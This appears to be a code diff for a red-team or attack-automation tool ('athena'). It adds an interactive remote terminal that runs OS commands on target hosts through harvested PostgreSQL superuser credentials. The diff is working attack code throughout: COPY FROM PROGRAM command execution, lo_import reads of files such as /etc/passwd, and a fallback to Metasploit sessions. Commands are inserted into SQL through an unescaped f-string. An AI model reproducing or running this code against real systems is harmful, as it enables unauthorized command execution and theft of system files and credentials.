@@ -93,6 +93,16 @@ async def ssh_terminal(
             operation_id, target_id,
         )
 
+        # Check for PostgreSQL shell (COPY TO PROGRAM) as additional fallback
+        pg_shell_row = await db.fetchrow(
+            "SELECT value FROM facts "
+            "WHERE operation_id = $1 AND source_target_id = $2 "
+            "AND trait = 'credential.shell' "
+            "AND value LIKE 'postgresql%%' "
+            "ORDER BY collected_at DESC LIMIT 1",
+            operation_id, target_id,
+        )
+
     # Decide backend: SSH or Metasploit
     use_msf = False
 
@@ -150,7 +160,12 @@ async def ssh_terminal(
                 "SSH failed after %d attempts, checking Metasploit fallback", _MAX_RETRIES
             )
 
-    # Fallback: Metasploit shell session
+    # Fallback 1: PostgreSQL COPY TO PROGRAM shell
+    if pg_shell_row:
+        await _run_pg_terminal(websocket, pg_shell_row["value"], hostname, ip_address)
+        return
+
+    # Fallback 2: Metasploit shell session
     if msf_row:
         use_msf = True
     else:
@@ -214,6 +229,222 @@ async def _run_ssh_terminal(
         except Exception:
             pass
         logger.info("SSH terminal session closed for %s", hostname)
+
+
+def _parse_pg_shell_credential(value: str) -> tuple[str, str, str, int]:
+    """Parse a credential.shell value like 'postgresql_exec:user:pass@host:port (...)'.
+
+    Returns (username, password, host, port).
+    """
+    # Strip the method prefix and trailing info
+    # Format: postgresql_exec:user:pass@host:port (output...)
+    #     or: postgresql_fileread:user:pass@host:port (output...)
+    rest = value.split(":", 1)[1] if ":" in value else value  # drop prefix
+    # rest = "user:pass@host:port (output...)"
+    paren_idx = rest.find(" (")
+    if paren_idx > 0:
+        rest = rest[:paren_idx]
+    # rest = "user:pass@host:port"
+    at_idx = rest.rfind("@")
+    if at_idx < 0:
+        raise ValueError(f"No '@' in pg credential: {value}")
+    user_pass = rest[:at_idx]
+    host_port = rest[at_idx + 1:]
+
+    colon_idx = user_pass.find(":")
+    if colon_idx < 0:
+        raise ValueError(f"No ':' separating user:pass in pg credential: {value}")
+    username = user_pass[:colon_idx]
+    password = user_pass[colon_idx + 1:]
+
+    if ":" in host_port:
+        host, port_s = host_port.rsplit(":", 1)
+        port = int(port_s)
+    else:
+        host = host_port
+        port = 5432
+
+    return username, password, host, port
+
+
+async def _run_pg_terminal(
+    websocket: WebSocket, cred_value: str, hostname: str, ip_address: str
+) -> None:
+    """Run interactive terminal via PostgreSQL COPY TO PROGRAM.
+
+    Each command is executed by connecting to PostgreSQL and running
+    COPY FROM PROGRAM. This is slower than SSH but works when the only
+    access vector is a PostgreSQL superuser credential.
+    """
+    try:
+        username, password, host, port = _parse_pg_shell_credential(cred_value)
+    except (ValueError, IndexError) as exc:
+        logger.warning("Failed to parse PostgreSQL shell credential: %s", exc)
+        await websocket.send_text(json.dumps({
+            "error": f"Invalid PostgreSQL shell credential format: {exc}"
+        }))
+        await websocket.close()
+        return
+
+    if not host:
+        host = ip_address
+
+    await websocket.send_text(json.dumps({
+        "output": (
+            f"Connected to {hostname} ({host}) via PostgreSQL superuser\r\n"
+            f"User: {username} | Port: {port}\r\n"
+        ),
+        "exit_code": 0,
+        "prompt": f"{username}@{hostname}:~$ ",
+    }))
+
+    try:
+        async for message in websocket.iter_text():
+            try:
+                data = json.loads(message)
+                cmd = str(data.get("cmd", "")).strip()
+            except (json.JSONDecodeError, AttributeError):
+                await websocket.send_text(json.dumps({"error": "Invalid JSON"}))
+                continue
+
+            if not cmd:
+                continue
+            if len(cmd) > MAX_CMD_LEN:
+                await websocket.send_text(json.dumps({
+                    "error": "Command too long (max 1024 chars)",
+                }))
+                continue
+            if _is_dangerous(cmd):
+                await websocket.send_text(json.dumps({
+                    "error": "Command refused: potentially destructive operation",
+                }))
+                continue
+
+            try:
+                output = await _pg_exec_command(host, port, username, password, cmd)
+                await websocket.send_text(json.dumps({
+                    "output": output or "(no output)\r\n",
+                    "exit_code": 0,
+                    "prompt": f"{username}@{hostname}:~$ ",
+                }))
+            except Exception as exc:
+                await websocket.send_text(json.dumps({
+                    "error": f"PostgreSQL exec error: {exc}",
+                }))
+    except WebSocketDisconnect:
+        pass
+    finally:
+        logger.info("PostgreSQL terminal session closed for %s", hostname)
+
+
+async def _pg_exec_command(
+    host: str, port: int, username: str, password: str, command: str
+) -> str:
+    """Execute a command via PostgreSQL superuser access.
+
+    Strategy (ordered by PostgreSQL version support):
+    1. COPY FROM PROGRAM (PostgreSQL >= 9.3) — direct OS command exec
+    2. lo_import file read (PostgreSQL 8.x+) — supports 'cat <path>' style
+    3. SQL passthrough — runs raw SQL for queries like SELECT, SHOW, etc.
+    """
+    import psycopg2  # noqa: PLC0415
+
+    loop = asyncio.get_running_loop()
+
+    def _exec():
+        conn = psycopg2.connect(
+            host=host, port=port, user=username, password=password,
+            connect_timeout=10,
+        )
+        conn.autocommit = True
+        cursor = conn.cursor()
+        try:
+            # Method 1: COPY FROM PROGRAM (PostgreSQL >= 9.3)
+            try:
+                cursor.execute("CREATE TEMP TABLE _athena_term (line TEXT)")
+                cursor.execute(f"COPY _athena_term FROM PROGRAM '{command}'")
+                cursor.execute("SELECT string_agg(line, E'\\n') FROM _athena_term")
+                row = cursor.fetchone()
+                result = (row[0] or "") if row else ""
+                cursor.execute("DROP TABLE IF EXISTS _athena_term")
+                return result
+            except psycopg2.errors.SyntaxError:
+                # PostgreSQL < 9.3: COPY TO PROGRAM not supported
+                conn.rollback()
+            except psycopg2.errors.InsufficientPrivilege:
+                conn.rollback()
+
+            # Method 2: lo_import for 'cat <path>' style commands
+            cmd_lower = command.strip()
+            if cmd_lower.startswith("cat "):
+                filepath = cmd_lower[4:].strip().strip("'\"")
+                return _pg_read_file(conn, cursor, filepath)
+
+            # Method 3: SQL passthrough for SQL-like commands
+            sql_prefixes = ("select ", "show ", "\\d", "explain ")
+            if cmd_lower.lower().startswith(sql_prefixes):
+                cursor.execute(command)
+                rows = cursor.fetchall()
+                if cursor.description:
+                    headers = [d[0] for d in cursor.description]
+                    lines = ["\t".join(headers)]
+                    for row in rows:
+                        lines.append("\t".join(str(c) for c in row))
+                    return "\n".join(lines)
+                return "(no results)"
+
+            # Method 4: Try common read-equivalent translations
+            file_commands = {
+                "id": "/etc/passwd",        # show users as substitute
+                "uname -a": "/proc/version",
+                "hostname": "/etc/hostname",
+                "ifconfig": "/proc/net/if_inet6",
+                "whoami": None,  # special case
+            }
+            if cmd_lower in file_commands:
+                if cmd_lower == "whoami":
+                    return username
+                fpath = file_commands[cmd_lower]
+                if fpath:
+                    return _pg_read_file(conn, cursor, fpath)
+
+            return (
+                f"[athena] PostgreSQL 8.x: COPY TO PROGRAM not supported.\r\n"
+                f"Available commands:\r\n"
+                f"  cat <filepath>  - Read a file (via lo_import)\r\n"
+                f"  SELECT ...      - Run SQL queries\r\n"
+                f"  id / uname -a / hostname / whoami - System info\r\n"
+            )
+        finally:
+            conn.close()
+
+    return await loop.run_in_executor(None, _exec)
+
+
+def _pg_read_file(conn, cursor, filepath: str) -> str:
+    """Read a file via PostgreSQL lo_import (works on 8.x+)."""
+    import psycopg2  # noqa: PLC0415
+    try:
+        conn.autocommit = False
+        cursor.execute("SELECT lo_import(%s)", (filepath,))
+        oid = cursor.fetchone()[0]
+        conn.commit()
+
+        lobj = conn.lobject(oid, "r")
+        data = lobj.read(8192)
+        lobj.close()
+        cursor.execute("SELECT lo_unlink(%s)", (oid,))
+        conn.commit()
+        conn.autocommit = True
+        return data or "(empty file)"
+    except psycopg2.errors.UndefinedFile:
+        conn.rollback()
+        conn.autocommit = True
+        return f"cat: {filepath}: No such file or directory"
+    except Exception as exc:
+        conn.rollback()
+        conn.autocommit = True
+        return f"cat: {filepath}: {exc}"
 
 
 async def _run_msf_terminal(
